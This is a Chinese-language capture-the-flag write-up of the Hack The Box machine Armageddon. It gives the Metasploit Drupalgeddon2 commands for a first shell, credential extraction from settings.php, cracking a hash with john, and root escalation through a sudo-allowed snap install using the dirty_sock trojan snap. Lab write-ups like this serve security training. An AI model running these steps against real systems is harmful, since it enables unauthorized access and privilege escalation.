## Armageddon介绍

![1617342317_6066af6dd01f1913dfcda.png!small?1617342315971](https://image.3001.net/images/20210402/1617342317_6066af6dd01f1913dfcda.png!small?1617342315971)

## 探测

二话不说先nmap扫一遍下ip

![1617342411_6066afcb3bcb054aea86b.png!small?1617342409385](https://image.3001.net/images/20210402/1617342411_6066afcb3bcb054aea86b.png!small?1617342409385)

Nmap显示只有两个端口是开放的22和80。

此外，它还告诉您这里使用的CMS（内容管理系统）是Drupal 7。

  

## msf渗透测试

 **启动matesploit：**

msfconsile

search drupal查看可利用的payload列表。

使用如下

    
    
     **use exploit/unix/webapp/drupal_drupalgeddon2  
    **  
    

  

show options

![1617342774_6066b136b86bfe75c69e7.png!small?1617342772945](https://image.3001.net/images/20210402/1617342774_6066b136b86bfe75c69e7.png!small?1617342772945)

  

set RHOSTS 10.10.10.233 设置远程host ip

run执行有时会报错(Exploit completed, but no session was created)，检查show options，show
targets，info检查一遍。

![1617342865_6066b191ea44cb3a590c2.png!small?1617342864545](https://image.3001.net/images/20210402/1617342865_6066b191ea44cb3a590c2.png!small?1617342864545)

 **meterpreter：**

经过多次尝试，我们成功地获得了meterpreter shell。接下来现在该进行枚举了。

经过一些枚举后，我得到了一个setting.php文件，其中包含MYSQL用户凭据。

![1617343073_6066b2613911a3e5b37d6.png!small?1617343071416](https://image.3001.net/images/20210402/1617343073_6066b2613911a3e5b37d6.png!small?1617343071416)

搜索用户和密码。

![1617343116_6066b28c163842499b7e8.png!small?1617343115053](https://image.3001.net/images/20210402/1617343116_6066b28c163842499b7e8.png!small?1617343115053)

![1617343145_6066b2a9344f810298b26.png!small?1617343143312](https://image.3001.net/images/20210402/1617343145_6066b2a9344f810298b26.png!small?1617343143312)

获得ssh用户凭证，现在有了MYSQL凭据尝试通过SSH使用凭据，但是没有用，继续尝试在本地连接到MYSQL数据库。得到了一个用户，它是密码哈希。

![1617343211_6066b2eb62673d4dee5e4.png!small?1617343209669](https://image.3001.net/images/20210402/1617343211_6066b2eb62673d4dee5e4.png!small?1617343209669)

 **jhon：**

使用jhon ****工具破解此哈希值。

    
    
     **john hash -w=/usr/share/wordlists/rockyou.txt**

![1617343619_6066b4838240410686ae8.png!small?1617343617730](https://image.3001.net/images/20210402/1617343619_6066b4838240410686ae8.png!small?1617343617730)

 **ssh：**

获得密码后，SSH获取用户标志。

    
    
     **ssh brucetherealadmin@10.10.10.233**  
    

![1617343738_6066b4fa89d4ee2310083.png!small?1617343736957](https://image.3001.net/images/20210402/1617343738_6066b4fa89d4ee2310083.png!small?1617343736957)

接下来寻求root权限。

 ****每当我有了用户密码时，首先要做的就是检查可与sudo一起使用的命令。

sudo -l查看超级用户能执行哪些命令。

![1617343887_6066b58fc38788d2b4ee5.png!small?1617343886072](https://image.3001.net/images/20210402/1617343887_6066b58fc38788d2b4ee5.png!small?1617343886072)

    
    
    [brucetherealadmin@armageddon ~]$ sudo -l
     Matching Defaults entries for brucetherealadmin on armageddon:
         !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
         env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
         env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
         secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
     User brucetherealadmin may run the following commands on armageddon:
       **(root) NOPASSWD: /usr/bin/snap install  
    **

 **寻找root能执行的命令：**

使用如下脚本。

<https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py>

在目标机上使用这个python代码中的Trojan_snap部分执行。

如果能看到如下文件：

![1617344129_6066b6813d1431d164488.png!small?1617344127370](https://image.3001.net/images/20210402/1617344129_6066b6813d1431d164488.png!small?1617344127370)

添加用户dirty_sock密码dirty_sock它是哈希形式。

添加到sudoer组中，从而赋予他特权以超级用户身份使用sudo命令运行所有命令。

![1617344334_6066b74e811453caf7502.png!small?1617344333105](https://image.3001.net/images/20210402/1617344334_6066b74e811453caf7502.png!small?1617344333105)

以sudo用户身份运行snap命令。并切换到我们的dirty_sock用户。

    
    
    sudo /usr/bin/snap install --devmode lol.snap
    And then using Sudo -i gives us the root 

![1617344465_6066b7d198a4a34aaf536.png!small?1617344463743](https://image.3001.net/images/20210402/1617344465_6066b7d198a4a34aaf536.png!small?1617344463743)

## 结束

OVER

  

